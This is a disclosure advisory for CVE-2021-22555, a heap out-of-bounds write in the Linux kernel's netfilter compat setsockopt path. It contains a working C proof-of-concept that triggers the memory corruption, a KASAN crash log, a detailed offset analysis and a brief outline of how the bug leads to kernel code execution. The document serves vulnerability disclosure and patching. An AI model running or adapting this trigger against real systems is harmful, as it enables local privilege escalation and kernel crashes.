---
title: 'Linux: Heap Out-Of-Bounds Write in xt_compat_target_from_user'
published: '2021-07-07T18:54:02Z'
severity: High
ghsa_id: GHSA-xxx5-8mvq-3528
cve_id: CVE-2021-22555
weaknesses: []
products:
- ecosystem: ''
  package_name: Linux Kernel
  affected_versions: '>=2.6.19 (9fa492cdc160cd27ce1046cb36f47d3b2b1efa21)'
  patched_versions: 5.12 (b29c457a6511435960115c0f548c4360d5f4801d), 5.10.31, 5.4.113,
    4.19.188, 4.14.231, 4.9.267, 4.4.267
cvss: null
credits:
- github_user_id: TheOfficialFloW
  name: Andy Nguyen
  avatar: https://avatars.githubusercontent.com/u/14246466?s=40&v=4
---

# Linux: Heap Out-Of-Bounds Write in xt_compat_target_from_user

## Summary

A heap out-of-bounds write affecting Linux since v2.6.19-rc1 was discovered in `net/netfilter/x_tables.c`.

## Severity

*High*

The compat IPT_SO_SET_REPLACE/IP6T_SO_SET_REPLACE setsockopt implementation in the netfilter subsystem in the Linux kernel allows local users to gain privileges or cause a denial of service (heap memory corruption) via user namespace. This vulnerability is very similar to CVE-2016-3134 (CVSSv3 8.4 High) and CVE-2016-4997 (CVSSv3 7.8 High).

## Proof Of Concept

Compile the code below using `gcc -m32 -o poc poc.c` and run it. The following panic has been observed on Linux 5.4.73 with KASAN:

```
[ 1240.038789] ==================================================================
[ 1240.038802] BUG: KASAN: slab-out-of-bounds in xt_compat_target_from_user+0x164/0x2a0 [x_tables]
[ 1240.038806] Write of size 4 at addr ffff88820e31be00 by task poc/317268

[ 1240.038813] CPU: 5 PID: 317268 Comm: poc Tainted: G           OE     5.4.73 #1
[ 1240.038815] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
[ 1240.038816] Call Trace:
[ 1240.038821]  dump_stack+0x96/0xca
[ 1240.038826]  print_address_description.constprop.0+0x20/0x210
[ 1240.038833]  ? xt_compat_target_from_user+0x164/0x2a0 [x_tables]
[ 1240.038836]  __kasan_report.cold+0x1b/0x41
[ 1240.038839]  ? module_put.part.0+0x61/0x190
[ 1240.038846]  ? xt_compat_target_from_user+0x164/0x2a0 [x_tables]
[ 1240.038849]  kasan_report+0x14/0x20
[ 1240.038852]  check_memory_region+0x129/0x1b0
[ 1240.038856]  memset+0x24/0x40
[ 1240.038863]  xt_compat_target_from_user+0x164/0x2a0 [x_tables]
[ 1240.038871]  ? xt_compat_match_from_user+0x2a0/0x2a0 [x_tables]
[ 1240.038874]  ? __kmalloc_node+0x127/0x380
[ 1240.038879]  translate_compat_table+0x8a6/0xb30 [ip6_tables]
[ 1240.038885]  ? ip6t_register_table+0x200/0x200 [ip6_tables]
[ 1240.038888]  ? kasan_unpoison_shadow+0x38/0x50
[ 1240.038892]  ? __kasan_kmalloc.constprop.0+0xcf/0xe0
[ 1240.038895]  ? kasan_kmalloc+0x9/0x10
[ 1240.038898]  ? __kmalloc_node+0x127/0x380
[ 1240.038902]  ? __kasan_check_write+0x14/0x20
[ 1240.038906]  compat_do_replace.isra.0+0x197/0x290 [ip6_tables]
[ 1240.038910]  ? translate_compat_table+0xb30/0xb30 [ip6_tables]
[ 1240.038914]  ? apparmor_task_free+0xa0/0xa0
[ 1240.038917]  ? memcg_kmem_put_cache+0x1b/0x90
[ 1240.038922]  ? ns_capable_common+0x5f/0x80
[ 1240.038926]  compat_do_ip6t_set_ctl+0x9d/0xc0 [ip6_tables]
[ 1240.038930]  compat_nf_setsockopt+0x5a/0xa0
[ 1240.038934]  compat_ipv6_setsockopt+0xb5/0x110
[ 1240.038938]  inet_csk_compat_setsockopt+0x61/0xb0
[ 1240.038941]  compat_tcp_setsockopt+0x1c/0x30
[ 1240.038945]  compat_sock_common_setsockopt+0x7e/0x90
[ 1240.038949]  __compat_sys_setsockopt+0xf9/0x1f0
[ 1240.038952]  ? __x32_compat_sys_recvmmsg_time32+0x80/0x80
[ 1240.038955]  ? check_stack_object+0x2d/0xb0
[ 1240.038958]  ? __kasan_check_write+0x14/0x20
[ 1240.038962]  __do_compat_sys_socketcall+0x3ff/0x4e0
[ 1240.038965]  ? __x32_compat_sys_setsockopt+0x80/0x80
[ 1240.038969]  ? ksys_unshare+0x3f4/0x550
[ 1240.038972]  ? walk_process_tree+0x1a0/0x1a0
[ 1240.038974]  ? __kasan_check_write+0x14/0x20
[ 1240.038977]  ? up_read+0x1a/0x90
[ 1240.038981]  ? do_user_addr_fault+0x3fa/0x580
[ 1240.038983]  ? __kasan_check_write+0x14/0x20
[ 1240.038987]  __ia32_compat_sys_socketcall+0x31/0x40
[ 1240.038992]  do_fast_syscall_32+0x125/0x38c
[ 1240.038995]  entry_SYSENTER_compat+0x7f/0x91
[ 1240.038998] RIP: 0023:0xf7fa5b49
[ 1240.039002] Code: c4 8b 04 24 c3 8b 14 24 c3 8b 1c 24 c3 8b 34 24 c3 8b 3c 24 c3 90 90 90 90 90 90 90 90 90 90 90 90 51 52 55 89 e5 0f 34 cd 80 <5d> 5a 59 c3 90 90 90 90 8d b4 26 00 00 00 00 8d b4 26 00 00 00 00
[ 1240.039004] RSP: 002b:00000000ff936780 EFLAGS: 00000282 ORIG_RAX: 0000000000000066
[ 1240.039007] RAX: ffffffffffffffda RBX: 000000000000000e RCX: 00000000ff936798
[ 1240.039009] RDX: 00000000ff9367fc RSI: 00000000f7f64000 RDI: 00000000ff936a0c
[ 1240.039011] RBP: 00000000ff936a28 R08: 0000000000000000 R09: 0000000000000000
[ 1240.039012] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
[ 1240.039014] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000

[ 1240.039019] Allocated by task 317268:
[ 1240.039023]  save_stack+0x23/0x90
[ 1240.039026]  __kasan_kmalloc.constprop.0+0xcf/0xe0
[ 1240.039029]  kasan_kmalloc+0x9/0x10
[ 1240.039031]  __kmalloc_node+0x127/0x380
[ 1240.039034]  kvmalloc_node+0x7b/0x90
[ 1240.039040]  xt_alloc_table_info+0x2f/0x60 [x_tables]
[ 1240.039044]  translate_compat_table+0x6ac/0xb30 [ip6_tables]
[ 1240.039048]  compat_do_replace.isra.0+0x197/0x290 [ip6_tables]
[ 1240.039052]  compat_do_ip6t_set_ctl+0x9d/0xc0 [ip6_tables]
[ 1240.039054]  compat_nf_setsockopt+0x5a/0xa0
[ 1240.039057]  compat_ipv6_setsockopt+0xb5/0x110
[ 1240.039059]  inet_csk_compat_setsockopt+0x61/0xb0
[ 1240.039061]  compat_tcp_setsockopt+0x1c/0x30
[ 1240.039064]  compat_sock_common_setsockopt+0x7e/0x90
[ 1240.039067]  __compat_sys_setsockopt+0xf9/0x1f0
[ 1240.039069]  __do_compat_sys_socketcall+0x3ff/0x4e0
[ 1240.039072]  __ia32_compat_sys_socketcall+0x31/0x40
[ 1240.039075]  do_fast_syscall_32+0x125/0x38c
[ 1240.039077]  entry_SYSENTER_compat+0x7f/0x91

[ 1240.039081] Freed by task 1817:
[ 1240.039085]  save_stack+0x23/0x90
[ 1240.039087]  __kasan_slab_free+0x137/0x180
[ 1240.039089]  kasan_slab_free+0xe/0x10
[ 1240.039092]  kfree+0x98/0x270
[ 1240.039094]  skb_free_head+0x43/0x50
[ 1240.039096]  skb_release_data+0x219/0x2c0
[ 1240.039099]  skb_release_all+0x33/0x40
[ 1240.039101]  consume_skb+0x54/0x100
[ 1240.039104]  unix_stream_read_generic+0xe42/0xf30
[ 1240.039107]  unix_stream_recvmsg+0xa2/0xd0
[ 1240.039108]  sock_recvmsg+0xad/0xb0
[ 1240.039110]  ____sys_recvmsg+0x166/0x290
[ 1240.039112]  ___sys_recvmsg+0xd3/0x140
[ 1240.039114]  __sys_recvmsg+0xc8/0x150
[ 1240.039117]  __x64_sys_recvmsg+0x48/0x50
[ 1240.039119]  do_syscall_64+0x72/0x1e0
[ 1240.039122]  entry_SYSCALL_64_after_hwframe+0x44/0xa9

[ 1240.039126] The buggy address belongs to the object at ffff88820e31bc00
                which belongs to the cache kmalloc-512(1335:user@1000.service) of size 512
[ 1240.039130] The buggy address is located 0 bytes to the right of
                512-byte region [ffff88820e31bc00, ffff88820e31be00)
[ 1240.039131] The buggy address belongs to the page:
[ 1240.039136] page:ffffea000838c600 refcount:1 mapcount:0 mapping:ffff88820ee93800 index:0xffff88820e318c00 compound_mapcount: 0
[ 1240.039138] flags: 0x17ffffc0010200(slab|head)
[ 1240.039143] raw: 0017ffffc0010200 ffffea00083aa800 0000000500000005 ffff88820ee93800
[ 1240.039147] raw: ffff88820e318c00 000000008020001c 00000001ffffffff 0000000000000000
[ 1240.039148] page dumped because: kasan: bad access detected

[ 1240.039150] Memory state around the buggy address:
[ 1240.039154]  ffff88820e31bd00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[ 1240.039157]  ffff88820e31bd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[ 1240.039161] >ffff88820e31be00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[ 1240.039163]                    ^
[ 1240.039166]  ffff88820e31be80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[ 1240.039170]  ffff88820e31bf00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[ 1240.039172] ==================================================================
[ 1240.039174] Disabling lock debugging due to kernel taint
[ 1240.039212] x_tables: ip6_tables: icmp6.0 match: invalid size 8 (kernel) != (user) 212
```

### poc.c

```c
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <linux/netfilter_ipv6/ip6_tables.h>

int main(int argc, char *argv[]) {
  int s;

  if (unshare(CLONE_NEWUSER) != 0) err(1, "unshare(CLONE_NEWUSER)");
  if (unshare(CLONE_NEWNET) != 0) err(1, "unshare(CLONE_NEWNET)");

  if ((s = socket(AF_INET6, SOCK_STREAM, 0)) < 0) err(1, "socket");

  struct {
    struct ip6t_replace replace;
    struct ip6t_entry entry;
    struct xt_entry_match match;
    char pad[0xD0];
    struct xt_entry_target target;
  } data = {0};

  data.replace.num_counters = 1;
  data.replace.num_entries = 1;
  data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
                       sizeof(data.pad) + sizeof(data.target));

  data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
                            sizeof(data.pad) + sizeof(data.target));
  data.entry.target_offset =
      (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));

  data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));
  strcpy(data.match.u.user.name, "icmp6");
  data.match.u.user.revision = 0;

  data.target.u.user.target_size = sizeof(data.target);
  strcpy(data.target.u.user.name, "NFQUEUE");
  data.target.u.user.revision = 1;

  // Trigger Out-Of-Bounds write in kmalloc-512 (offset 0x200-0x204 overwritten
  // with zeros).
  if (setsockopt(s, SOL_IPV6, IP6T_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
    if (errno == ENOPROTOOPT)
      err(1, "Error: ip6_tables module is not loaded");
  }

  close(s);

  return 0;
}
```

## Analysis

### Vulnerability

The vulnerability was introduced in [commit 9fa492cdc160cd27ce1046cb36f47d3b2b1efa21](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/netfilter/x_tables.c?id=9fa492cdc160cd27ce1046cb36f47d3b2b1efa21).

When `IPT_SO_SET_REPLACE` or `IP6T_SO_SET_REPLACE` is called in compat mode, kernel structures need to be converted from 32bit to 64bit. Unfortunately, the allocation size for the conversion is not properly calculated, leading to a few bytes of zero written out-of-bounds in `xt_compat_target_from_user()`. By pushing the structure size to the boundary, adjacent objects on the slab can be corrupted.

Hereby, we demonstrate the IPv6 path that results in 4 bytes being written at offset 0x200 of a 512-bytes allocation:

1. When `IP6T_SO_SET_REPLACE` is called in compat mode, `compat_do_replace()` is invoked which copies the argument from userland to kernel and then proceeds to call `translate_compat_table()`.

2. The function `translate_compat_table()` then checks all entries for validity and computes the new structure size which is to be allocated by `newinfo = xt_alloc_table_info(size)`. **The problem here is that `target->targetsize` is not taken into account**, but only `XT_ALIGN(target->targetsize) - COMPAT_XT_ALIGN(target->targetsize)` from `xt_compat_target_offset()`. Spoiler: Using the data structure from the PoC above, the object is allocated in the kmalloc-512 slab.
   
3. Next, it proceeds to call `compat_copy_entry_from_user()` with `newinfo->entries` as destination, which starts at offset 0x40.

4. The subroutine `compat_copy_entry_from_user()` converts `struct ip6t_entry`, `struct xt_entry_match` and `struct xt_entry_target` entries:

   1. For `struct ip6t_entry`, the destination pointer is advanced by `sizeof(struct ip6t_entry)=0xa8` bytes. At this point, the destination pointer is at offset 0xe8.

   2. For `xt_entry_match`, `xt_compat_match_from_user()` is called which advances the pointer by `sizeof(struct xt_entry_match)=0x20`, `sizeof(pad)=0xd0`, and an additional 4 bytes alignment for `struct ip6t_icmp`. At this point, the destination pointer is at offset 0x1dc.

   3. Finally, for `struct xt_entry_target`, `xt_compat_target_from_user()` is called:

      ```c
      void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
      				unsigned int *size)
      {
      	const struct xt_target *target = t->u.kernel.target;
      	struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;
      	int pad, off = xt_compat_target_offset(target);
      	u_int16_t tsize = ct->u.user.target_size;
      	char name[sizeof(t->u.user.name)];
      
      	t = *dstptr;
      	memcpy(t, ct, sizeof(*ct));
      	if (target->compat_from_user)
      		target->compat_from_user(t->data, ct->data);
      	else
      		memcpy(t->data, ct->data, tsize - sizeof(*ct));
      	pad = XT_ALIGN(target->targetsize) - target->targetsize;
      	if (pad > 0)
      		memset(t->data + target->targetsize, 0, pad);
      
      	tsize += off;
      	t->u.user.target_size = tsize;
      	strlcpy(name, target->name, sizeof(name));
      	module_put(target->me);
      	strncpy(t->u.user.name, name, sizeof(t->u.user.name));
      
      	*size += off;
      	*dstptr += tsize;
      }
      ```

      Here, `memset(t->data + target->targetsize, 0, pad);` is of our interest. As mentioned before, `target->targetsize` is not taken into account for the allocation size - only the difference between the alignments. As such, `t->data + target->targetsize` may be out-of-bounds (with `NFLOG` target, it can even be **up to 0x4C bytes out-of-bounds!**). For our example, we use `NFQUEUE` as target as it has a simple structure:

      ```c
      struct xt_NFQ_info_v1 {
      	__u16 queuenum;
      	__u16 queues_total;
      };
      ```

      With that as target, `target->targetsize` will be 4 bytes and `pad = XT_ALIGN(target->targetsize) - target->targetsize;`, which is `pad = (target->targetsize + 7) & ~7 - target->targetsize`, will thus be 4 bytes as well. The field `data` of `struct xt_entry_target` is at offset 0x20, and `t` is `newinfo + 0x1dc` as previously shown. As such, we can deduce the following offset for `memset()`:

      ```
          memset(t->data + target->targetsize, 0, pad);
      <=> memset(newinfo + 0x1dc + 0x20 + target->targetsize, 0, pad);
      <=> memset(newinfo + 0x1dc + 0x20 + 4, 0, 4);
      <=> memset(newinfo + 0x200, 0, 4);
      ```

### Exploitability

This vulnerability can be exploited by partially overwriting the `m_list->next` pointer of the `msg_msg` structure and achieving a use-after-free. This is powerful enough to gain kernel code execution while bypassing KASLR, SMAP and SMEP.

## Syzkaller

While the vulnerability was found by code auditing, it was also detected *once* by https://syzkaller.appspot.com/bug?id=a53b68e5178eec469534aca80fca1735fb3d8071, however not with a reproducible C code.

### Timeline
**Date reported**: 2021-04-06
**Date fixed**: 2021-04-13
**Date disclosed**: 2021-07-07